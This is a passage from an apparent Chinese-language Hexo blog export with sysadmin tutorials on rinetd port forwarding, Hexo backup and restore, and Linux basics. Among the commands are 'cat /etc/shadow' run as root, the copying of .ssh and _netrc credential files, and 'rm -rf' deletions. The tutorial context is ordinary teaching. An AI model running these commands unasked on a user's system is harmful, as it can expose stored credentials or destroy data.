<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[bindaddress] [bindport] [connectaddress] [connectport]</span><br><span class="line">绑定的地址    绑定的端口  连接的地址      连接的端口</span><br><span class="line"></span><br><span class="line">[Source Address] [Source Port] [Destination Address] [Destination Port]</span><br><span class="line">源地址            源端口         目的地址               目的端口</span><br></pre></td></tr></table></figure>

<p>在每一单独的行中指定每个要转发的端口。源地址和目的地址都可以是主机名或IP地址，IP 地址0.0.0.0将rinetd绑定到任何可用的本地IP地址上。例如：0.0.0.0 8080 <a href="http://www.hi-linux.com/" target="_blank" rel="noopener">www.hi-linux.com</a> 80<br>配置规则</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/rinetd.conf</span></span><br><span class="line"></span><br><span class="line">0.0.0.0 8080 172.19.94.3 8080</span><br><span class="line">0.0.0.0 2222 192.168.0.103 3389</span><br><span class="line">1.2.3.4 80 192.168.0.10 80</span><br><span class="line">allow *.*.*.*</span><br><span class="line">logfile /var/log/rinetd.log</span><br></pre></td></tr></table></figure>

<p>说明</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0.0.0.0表示本机绑定所有可用地址</span><br><span class="line">将所有发往本机8080端口的请求转发到172.19.94.3的8080端口</span><br><span class="line">将所有发往本机2222端口的请求转发到192.168.0.103的3389端口</span><br><span class="line">将所有发往1.2.3.4的80端口请求转发到192.168.0.10的80端口</span><br><span class="line">allow设置允许访问的ip地址信息,..*.*表示所有IP地址</span><br><span class="line">logfil设置打印的log的位置</span><br></pre></td></tr></table></figure>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>脚本启动</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> /etc/init.d/rinetd start</span></span><br></pre></td></tr></table></figure>

<p>编译安装不自带脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> /usr/sbin/rinetd -c /etc/rinetd.conf</span></span><br></pre></td></tr></table></figure>

<h2 id="加入到开机启动脚本中"><a href="#加入到开机启动脚本中" class="headerlink" title="加入到开机启动脚本中"></a>加入到开机启动脚本中</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> rinetd &gt;&gt; /etc/rc.local</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/rc.local</span></span><br></pre></td></tr></table></figure>

<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.rinetd.conf中绑定的本机端口必须没有被其它程序占用</span><br><span class="line">2.运行rinetd的系统防火墙应该打开绑定的本机端口</span><br><span class="line">3.不支持FTP的跳转</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 检查进程是否启动</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ps aux | grep -I rinetd</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 检查监控的端口是否开启</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> netstat -tanop | grep 4408</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>rinetd</category>
      </categories>
      <tags>
        <tag>rinetd</tag>
      </tags>
  </entry>
  <entry>
    <title>重装系统后Hexo的备份与恢复</title>
    <url>/2019/08/21/%E9%87%8D%E8%A3%85%E7%B3%BB%E7%BB%9F%E5%90%8EHexo%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="重装系统后Hexo的备份与恢复"><a href="#重装系统后Hexo的备份与恢复" class="headerlink" title="重装系统后Hexo的备份与恢复"></a>重装系统后Hexo的备份与恢复</h1><p>最近重装了系统，顺便写下hexo的备份与恢复过程。当然要先在文件夹选项里选择“显示隐藏文件”和取消“隐藏已知文件的扩展名”。</p>
<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><ol>
<li>备份好hexo目录下的<code>source</code>文件夹，<code>theme</code>文件夹、<code>node_modules</code>文件夹（里面有你安装的插件，这个可选）和站点配置<code>_config.yml</code>文件（当然如果你硬盘空间够大，备份整个hexo文件夹也可以）。然后把hexo目录里面的东西全部删掉。</li>
<li>备份用户目录下的文件：开始，你的windows用户名，打开你的用户文件夹后备份<code>.ssh</code>文件夹和<code>.gitconfig</code>、<code>_netrc</code>以及<code>_viminfo</code>这三个文件。</li>
</ol>
<h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><ol>
<li>安装Git<br>去<a href="https://msysgit.github.io/" target="_blank" rel="noopener">https://msysgit.github.io</a>直接点击download下载git，安装时我选择安装到D盘，然后勾选“<code>On the Desktop</code>”添加桌面快捷方式，然后一路next即可。</li>
<li>安装node.js<br>去<a href="https://nodejs.org/download/点击那个windows" target="_blank" rel="noopener">https://nodejs.org/download/点击那个windows</a> installer图标，下载<code>node-v0.12.4-x86.msi</code>，一路next即可。</li>
<li>去<a href="https://hexo.io/" target="_blank" rel="noopener">hexo官方</a>看到hexo的安装命令已经改为：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<p>于是运行gitbash后，先在标题栏右键，属性，“快速编辑模式”打勾，然后右键（粘贴）以上命令，接着：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd D:\hexo</span><br><span class="line">hexo init</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>安装插件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-generator-feed --save</span><br><span class="line">npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>

<p><strong>当然你也可以去事先备份的<code>node_modules</code>文件夹找到你想要安装的插件，然后粘贴到对应位置。</strong></p>
<p>下载主题：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/xiangming/landscape-plus.git themes/landscape-plus</span><br></pre></td></tr></table></figure>

<ol>
<li>制事先备份的source文件夹，theme文件夹和站点配置<code>_config.yml</code>文件粘贴替换掉<code>D:\hexo</code>里的文件。</li>
<li>和gitcafe建立连接<br>在gitbash里输入：</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.email "Your email"</span><br><span class="line">git config --global user.name "Your name"</span><br></pre></td></tr></table></figure>

<p>然后开始，你的windows用户名，打开你的用户文件夹，粘贴并替换事先备份的<code>.ssh</code>文件夹和<code>.gitconfig</code>、<code>_netrc</code>以及<code>_viminfo</code>这三个文件。<br>然后再输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -T git@gitcafe.com</span><br></pre></td></tr></table></figure>

<p>这时会看到显示连接成功信息。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">注意：如果更换电脑的话，则在输入命令前需要新建一个用户的环境变量（计算机，右键属性，高级系统设置，最下面“环境变量”，好像新建系统环境变量也可以），变量名为HOME，变量值为 %USERPROFILE%。这样才能显示连接成功信息。</span><br></pre></td></tr></table></figure>

<p>这时，一切都回到了原来的样子。</p>
]]></content>
      <categories>
        <category>HEXO</category>
      </categories>
      <tags>
        <tag>HEXO</tag>
      </tags>
  </entry>
  <entry>
    <title>linux基本操作</title>
    <url>/2018/04/16/linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="①Linux-系统部署"><a href="#①Linux-系统部署" class="headerlink" title="①Linux 系统部署"></a>①Linux 系统部署</h1><h2 id="一、GNU-Linux-的历史"><a href="#一、GNU-Linux-的历史" class="headerlink" title="一、GNU/Linux 的历史"></a>一、GNU/Linux 的历史</h2><p>1.自由软件之父：Richard M. Stallman  理查德·斯托曼（GNU的创始人）</p>
<p>2.Linux 之父 ：林纳斯•本纳第克特•托瓦兹（Linus Benedict Torvalds）</p>
<h2 id="二、Linux发行版介绍"><a href="#二、Linux发行版介绍" class="headerlink" title="二、Linux发行版介绍"></a>二、Linux发行版介绍</h2><p>1．RHEL（Red Hat Enterprise Linux）</p>
<p>Red Hat公司的Linux系统，商业版</p>
<p>2、CentOS（Community Enterprise Operating System）</p>
<p>社区企业操作系统，不包含封闭源代码软件</p>
<p>3.Ubunt（乌班图）</p>
<p>一个以桌面应用为主的开源GNU/Linux操作系统，基于Debian GNU/Linux</p>
<p>4.Debian</p>
<p>常指Debian GNU/Linux。广义的Debian是指一个致力于创建自由操作系统的合作组织及其作品，Debian项目众多内核分支中以Linux宏内核为主，开发者所创建的操作系统中绝大部分基础工具来自于GNU工程 </p>
<h2 id="三、Linux相关认证"><a href="#三、Linux相关认证" class="headerlink" title="三、Linux相关认证"></a>三、Linux相关认证</h2><p>RHCA   红帽认证架构师<br>        RHCE  红帽认证工程师<br>        RHCSA   红帽认证系统管理员</p>
<h2 id="四、Linux系统部署（掌握）"><a href="#四、Linux系统部署（掌握）" class="headerlink" title="四、Linux系统部署（掌握）"></a>四、Linux系统部署（掌握）</h2><h3 id="1-服务器介绍"><a href="#1-服务器介绍" class="headerlink" title="1.服务器介绍"></a>1.服务器介绍</h3><p><strong>塔式服务器</strong></p>
<p>常见，外形结构和普通PC类似。塔式服务器尺寸没有统一标准，由于塔式服务器的机箱比较大，服务器的配置也可以很高，冗余扩展很齐备，所以应用范围非常广，是目前使用率最高的一种服务器。</p>
<p><strong>机架式服务器</strong></p>
<p>机架式服务器的外形像交换机，有1U（1U=1.75英寸）、2U、4U等规格。机架式服务器安装在标准的19英寸机柜里面。这种结构的多为功能型服务器。</p>
<p><strong>刀片式服务器</strong>（属于机架式）</p>
<p>刀片服务器在标准高度的机架式机箱内可插装多个卡式的服务器单元，是一种实现HAHD(高可用高密度)的低成本服务器平台，为特殊应用行业和高密度计算环境专门设计。刀片服务器就像“刀片”一样，每一块“刀片”就是一块系统主板。</p>
<h3 id="2-VMware部署CENTOS"><a href="#2-VMware部署CENTOS" class="headerlink" title="2.VMware部署CENTOS"></a>2.VMware部署CENTOS</h3><p>1.安装并打开VMWARE（使用管理员身份运行）<br>        2.在VMware中新建虚拟机<br>        3.典型/自定义，选择自定义安装<br>        4.虚拟机兼容性，默认下一步<br>        5.安装来源，选择稍后安装操作系统<br>        7.操作系统类型，选择linux centos7 64<br>        8.自定义虚拟机名称，和文件夹位置。D:\KF\VM\Centos7-1-64<br>        9.虚拟机CPU，默认下一步<br>        10.内存选择，1024MB<br>        11.网络连接，选择桥接<br>        12.IO类型，默认下一步<br>        13.虚拟磁盘类型，默认下一步<br>        14.创建新磁盘，默认下一步<br>        15.磁盘大小，默认下一步，20G<br>        16.磁盘文件名，默认下一步<br>        17.完成<br>        18.在新虚拟机，选择DVD，选用ISO 镜像，选择CENTOS7 安装镜像<br>        19.开启此虚拟机<br>        20.install centos 7 安装操作系统<br>        21.中文，简体中文<br>        22.软件选择：带GUI的服务器、兼容、开发<br>        23.安装位置：默认选择完成（自动分区）<br>        24.点击开始安装<br>        25.设置root密码<br>        26.同意许可，完成配置<br>        27.时区亚洲上海，用户名，密码<br>        28.root身份进入系统桌面<br>        29.开启网卡自动连接<br>        30.完成实验</p>
<h2 id="五、Linux系统基本操作（了解）"><a href="#五、Linux系统基本操作（了解）" class="headerlink" title="五、Linux系统基本操作（了解）"></a>五、Linux系统基本操作（了解）</h2><p>1.登录root用户<br>        2.打开主文件夹创建并删除文件<br>        3.改变目录：cd  目录名</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd		/etc/sysconfig/network-scritpt</span><br><span class="line">cd		/root</span><br><span class="line">cd  	/aaa/bbb/ccc</span><br></pre></td></tr></table></figure>

<p>4.创建文件:  touch 文件名<br>        5.删除文件： rm -rf  文件名<br>        6.改名文件：mv  源文件 目标文件<br>        7.关机：init  0</p>
<h1 id="②Linux文件和用户管理"><a href="#②Linux文件和用户管理" class="headerlink" title="②Linux文件和用户管理"></a>②Linux文件和用户管理</h1><h2 id="一、文件管理"><a href="#一、文件管理" class="headerlink" title="一、文件管理"></a>一、文件管理</h2><h3 id="1-Linux目录结构"><a href="#1-Linux目录结构" class="headerlink" title="1.Linux目录结构"></a>1.Linux目录结构</h3><p>Linux: 以单根的方式组织文件 /</p>
<p>Linux系统的文件是没有扩展名！！！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看Linux目录结构</span></span><br><span class="line">[root@qianfeng ~]# ls /    </span><br><span class="line">bin dev lib media net root srv usr</span><br><span class="line">boot etc lib64 misc opt sbin sys var</span><br><span class="line">cgroup home lost+found mnt proc selinux tmp</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">目录名称</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">bin</td>
<td align="center">普通用户命令目录   /bin/ls, /bin/date</td>
</tr>
<tr>
<td align="center">sbin</td>
<td align="center">管理员使命令目录   /sbin/service</td>
</tr>
<tr>
<td align="center">dev</td>
<td align="center">设备文件目录。硬件，驱动  /dev/sda,/dev/sda1</td>
</tr>
<tr>
<td align="center">root</td>
<td align="center">root用户家目录</td>
</tr>
<tr>
<td align="center">home</td>
<td align="center">普通用户家目录</td>
</tr>
<tr>
<td align="center">etc</td>
<td align="center">系统配置文件，控制台文件</td>
</tr>
<tr>
<td align="center">usr</td>
<td align="center">系统文件，/usr/local 软件安装的目录</td>
</tr>
<tr>
<td align="center">tmp</td>
<td align="center">临时文件</td>
</tr>
<tr>
<td align="center">var</td>
<td align="center">存放一些变化文件，比如数据库，日志，邮件</td>
</tr>
<tr>
<td align="center">boot</td>
<td align="center">系统启动的相关文件，启动目录</td>
</tr>
<tr>
<td align="center">run</td>
<td align="center">运行</td>
</tr>
<tr>
<td align="center">media</td>
<td align="center">移动设备默认的挂载点</td>
</tr>
<tr>
<td align="center">mnt</td>
<td align="center">手工挂载设备的挂载点</td>
</tr>
<tr>
<td align="center">lib、lib64</td>
<td align="center">库文件Glibc</td>
</tr>
<tr>
<td align="center">lost+found</td>
<td align="center">fsck修复时，存储没有链接的文件或目录</td>
</tr>
</tbody></table>
<h3 id="2-文件管理"><a href="#2-文件管理" class="headerlink" title="2.文件管理"></a>2.文件管理</h3><ul>
<li><h4 id="文件类型（理解）"><a href="#文件类型（理解）" class="headerlink" title="文件类型（理解）"></a>文件类型（理解）</h4></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">命令ll  -d 可查看</span><br><span class="line"></span><br><span class="line">- 普通文件</span><br><span class="line">d 目录文件</span><br><span class="line"></span><br><span class="line">非常见类型：</span><br><span class="line">b 设备文件（块设备）存储设备硬盘，U盘</span><br><span class="line">c 设备文件（字符设备）打印机，终端 /dev/tty1</span><br><span class="line">l 链接文件</span><br><span class="line">s 套接字文件</span><br><span class="line">p 管道文件</span><br></pre></td></tr></table></figure>

<ul>
<li><h4 id="文件管理命令"><a href="#文件管理命令" class="headerlink" title="文件管理命令"></a>文件管理命令</h4></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 1.改变目录</span></span></span><br><span class="line">cd  路径</span><br><span class="line">绝对路径： 从/开始的路径 /home/alice/file1</span><br><span class="line">相对路径： 相对于当前目录开始 ./a.txt</span><br><span class="line"></span><br><span class="line">ls   列出目录当中的内容</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 2.创建文件</span></span></span><br><span class="line">touch    路径和名字</span><br><span class="line">示例</span><br><span class="line">touch file3 file4</span><br><span class="line">touch /home/file10.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 3.创建目录</span></span></span><br><span class="line">mkdir      路径和目录名    </span><br><span class="line">mkdir  -p   父系，当创建目录没有上一级时，自动递归创建</span><br><span class="line"></span><br><span class="line">示例====参数 -v 详细 -p 递归</span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir dir1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir /home/dir2 /home/dir3</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir /home/&#123;dir4,dir5&#125;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir -v /home/&#123;dir6,dir7&#125;	//显示详细信息，遍历</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir -v /home/dir8/111/22	//错误示范</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir -pv /home/dir8/111/222  //包括其父母的创建，不会有任何消息输出</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir -pv /home/&#123;qianfeng/&#123;dir1,111&#125;,nizhan&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 4.复制</span></span></span><br><span class="line">cp   源文件路径     目标文件夹</span><br><span class="line">cp  -r    源目录    目标目录</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">====参数 -r 目录 -v 详细 -f 强制   -n  静默</span><br><span class="line"><span class="meta">#</span><span class="bash"> cp -v install.log  /home/dir1	  //-v 显示详细信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp -v install.log  /home/dir1/qianfeng.txt</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp -rv  /etc  /home/dir1    //-r 拷贝文件夹</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp  -rv  源文件1 源文件2 源文件N  目标文件 //将多个文件拷贝到同一个目录</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> cp -rfn /etc /tmp    //-f, --force 强制</span></span><br><span class="line"></span><br><span class="line">cp是什么</span><br><span class="line">[root@qianfeng ~]# type -a cp</span><br><span class="line">cp is azliased to `cp -i'</span><br><span class="line">cp is /bin/cp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 5.移动</span></span></span><br><span class="line">mv    源文件路径   目标文件路径</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">1.创建一个新文件file1</span><br><span class="line"><span class="meta">#</span><span class="bash">touch  /root/file1</span></span><br><span class="line">2.把file1文件移动到/tmp目录中。</span><br><span class="line"><span class="meta">#</span><span class="bash"> mv    /root/file1    /tmp </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls    /tmp/file1</span></span><br><span class="line">3.把file1文件更名为file2</span><br><span class="line"><span class="meta">#</span><span class="bash"> mv    /tmp/file1     /tmp/file2</span></span><br><span class="line">4.观察file1文件已经更名为file2</span><br><span class="line"><span class="meta">#</span><span class="bash"> ls  /tmp/file1    /tmp/file2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 6.删除</span></span></span><br><span class="line">rm -rf    文件或目录的路径</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line">====参数  -r 递归 -f force强制 -v 详细过程     *通配符    文件名</span><br><span class="line">[root@qianfeng ~]# rm -rf /home/dir10/* //不包括隐藏文件</span><br><span class="line"></span><br><span class="line">如果快速删除如下文件，“file1.txt和file2.txt”</span><br><span class="line">[root@qianfeng ~]# rm -rf file*</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 7.查看文件内容</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cat全部</span></span><br><span class="line"> cat  文件路径</span><br><span class="line">===参数  -n 显示行号   -A 包括控制字符（换行符/制表符）</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> more翻页</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##### head头部</span></span></span><br><span class="line">[root@qianfeng ~]# head /etc/passwd</span><br><span class="line">[root@qianfeng ~]# head -2 /etc/passwd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> tail尾部</span></span><br><span class="line">[root@qianfeng ~]# tail /etc/passwd</span><br><span class="line">[root@qianfeng ~]# tail -1 /etc/passwd</span><br><span class="line">[root@qianfeng ~]# tail -f /var/log/secure</span><br><span class="line">注释：tail  -f 动态查看文件的尾部</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> grep过滤关键字</span></span><br><span class="line">语法：grep 关键字   文件名</span><br><span class="line">例：grep 'root' /etc/passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">## 8.修改文件内容</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 重定向  &lt;  &gt;   &lt;&lt;    &gt;&gt;</span></span><br><span class="line">[root@qianfeng ~]# ls -a &gt; list.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件编辑器1</span></span><br><span class="line">图形文件编辑器 gedit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件编辑器2</span></span><br><span class="line">vi, vim</span><br><span class="line"></span><br><span class="line">可视模式，按V进入，小v光标选取，大V直接选取一行，YYp复制粘贴</span><br><span class="line"></span><br><span class="line">ctrl+V，上下选择，然后可以ctrl+&gt;   进行整体缩进</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">命令模式</span><br><span class="line"></span><br><span class="line">hjkL              //上下左右</span><br><span class="line">0 $               //行首行尾</span><br><span class="line">gg G 			//页首页尾</span><br><span class="line">3G 进入第三行  </span><br><span class="line">/string (n N 可以循环的)     //查找字符，按n键选下一个（重要）</span><br><span class="line">y 复制</span><br><span class="line">d 删除</span><br><span class="line">p 粘贴</span><br><span class="line">u undo撤销</span><br><span class="line">							</span><br><span class="line">a 进入插入模式</span><br><span class="line">i 进入插入模式</span><br><span class="line">o 进入插入模式</span><br><span class="line">A 进入插入模式</span><br><span class="line"></span><br><span class="line">: 进入末行模式（扩展命令模式）</span><br><span class="line">v 进入可视模式</span><br><span class="line">ESC 返回命令模式</span><br><span class="line"></span><br><span class="line">保存、退出</span><br><span class="line"></span><br><span class="line">:w 保存 </span><br><span class="line">:q 退出 </span><br><span class="line">:wq 保存并退出 </span><br><span class="line">:q! 强制退出不保存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">查找替换</span><br><span class="line"></span><br><span class="line">:范围 s/原内容/新内容/全局 </span><br><span class="line">:1,5 s/root/qianfeng/g          从1－5行的root 替换为qianfeng</span><br><span class="line">读入文件/写文件(另存为)</span><br><span class="line">:w /tmp/aaa.txt 另存为/tmp/aaa.txt </span><br><span class="line"></span><br><span class="line">设置环境 </span><br><span class="line"></span><br><span class="line">:set nu 设置行号 </span><br><span class="line">:set list 显示控制字符</span><br><span class="line">:set nonu 取消设置行号</span><br></pre></td></tr></table></figure>

<h2 id="二、用户管理"><a href="#二、用户管理" class="headerlink" title="二、用户管理"></a>二、用户管理</h2><h3 id="1-查看用户-组"><a href="#1-查看用户-组" class="headerlink" title="1.查看用户/组"></a>1.查看用户/组</h3><p>查看当前登录的用户信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>

<p>查看文件的owner:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# ll /home/ </span><br><span class="line">drwx------. 4 alice alice 4096 Jun 2 15:59 alice</span><br><span class="line">drwx------. 2 root root 16384 Jun 1 23:09 lost+found</span><br><span class="line">drwxr-xr-x 	2 root root 4096 Jun 2 15:33 qianfeng</span><br></pre></td></tr></table></figure>

<p>查看运行进程的username：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# ps aux </span><br><span class="line">USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND</span><br><span class="line">root 1 0.0 0.0 19360 1536 ? Ss 13:29 0:00 /sbin/init</span><br><span class="line">root 2 0.0 0.0 0 0 ? S 13:29 0:00 [kthreadd]</span><br><span class="line">root 3 0.0 0.0 0 0 ? S 13:29 0:00 [migration/0]</span><br></pre></td></tr></table></figure>

<h3 id="2-用户-组信息文件"><a href="#2-用户-组信息文件" class="headerlink" title="2.用户/组信息文件"></a>2.用户/组信息文件</h3><p><strong>用户基本信息文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# cat /etc/passwd      #冒号分割为7列字段</span><br><span class="line"> root:x:0:0:root:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">root  用户名,登录系统的名字</span><br><span class="line">X     密码占位符,具体内容不在这里</span><br><span class="line">0     UID,用户的身份证号</span><br><span class="line">0     GID,GROUP 组号</span><br><span class="line">root  描述,比如经理 manager</span><br><span class="line">/root 家目录,登录系统时所在目录</span><br><span class="line">/bin/bash  登录shell (shell：命令解释器)</span><br><span class="line"></span><br><span class="line">系统约定： RHEL7</span><br><span class="line">uid: 0 特权用户</span><br><span class="line">uid: 1~499 系统用户</span><br><span class="line">uid: 1000+ 普通用户</span><br></pre></td></tr></table></figure>

<p><strong>用户密码信息文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# cat /etc/shadow       #冒号分割为8列</span><br><span class="line"> root : $1$MYG2N : 15636 : 0 : 99999 : 7 :   :   :</span><br><span class="line"> </span><br><span class="line">了解即可</span><br><span class="line">加密算法$id$salt$encrypted</span><br><span class="line"><span class="meta">$</span><span class="bash">1: MD5</span></span><br><span class="line"><span class="meta">$</span><span class="bash">5: SHA-256</span></span><br><span class="line"><span class="meta">$</span><span class="bash">6: SHA-512</span></span><br><span class="line">--------------------------</span><br><span class="line">1）“登录名”是与/etc/passwd文件中的登录名相一致的用户账号</span><br><span class="line">2）“口令”字段存放的是加密后的用户口令字，如果为空，则对应用户没有口令，登录时不需要口令；   </span><br><span class="line">星号代表帐号被锁定；</span><br><span class="line">双叹号表示这个密码已经过期了。</span><br><span class="line"><span class="meta">$</span><span class="bash">6$开头的，表明是用SHA-512加密的，</span></span><br><span class="line"><span class="meta">$</span><span class="bash">1$ 表明是用MD5加密的</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2$ 是用Blowfish加密的</span></span><br><span class="line"><span class="meta">$</span><span class="bash">5$ 是用 SHA-256加密的。 </span></span><br><span class="line"></span><br><span class="line">3）“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样</span><br><span class="line">4）“最小时间间隔”指的是两次修改口令之间所需的最小天数。</span><br><span class="line">5）“最大时间间隔”指的是口令保持有效的最大天数。</span><br><span class="line">6）“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。</span><br><span class="line">7）“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。（软限制。到期后多少天就不能用账号了。）</span><br><span class="line">8）“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。（硬限制）</span><br><span class="line">9) 保留</span><br></pre></td></tr></table></figure>

<p><strong>组信息文件</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@qianfeng ~]# cat /etc/group </span><br><span class="line">    root  :  x  :  0  :</span><br><span class="line">    组名  :组密码: 组ID :组成员(默认为空)</span><br></pre></td></tr></table></figure>

<h3 id="2-用户-组管理"><a href="#2-用户-组管理" class="headerlink" title="2.用户/组管理"></a>2.用户/组管理</h3><p>用户管理</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#创建用户 未指定选项＝＝系统会创建一个和用户名相同的组作为用户的Primary Group</span></span></span><br><span class="line"></span><br><span class="line">[root@qianfeng ~]# useradd user01 </span><br><span class="line">[root@localhost ~]# id     user01</span><br><span class="line">uid=1001(user01) gid=1001(user01) 组=1001(user01)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#创建用户    指定选项</span></span></span><br><span class="line"></span><br><span class="line">[root@qianfeng ~]# useradd user02 -u 1503       //创建用户usr02，指定uid</span><br><span class="line">[root@qianfeng ~]# useradd user03 -d /user03    //创建用户user03 指定家目录</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#删除用户</span></span></span><br><span class="line">[root@qianfeng ~]# userdel -r user02</span><br></pre></td></tr></table></figure>

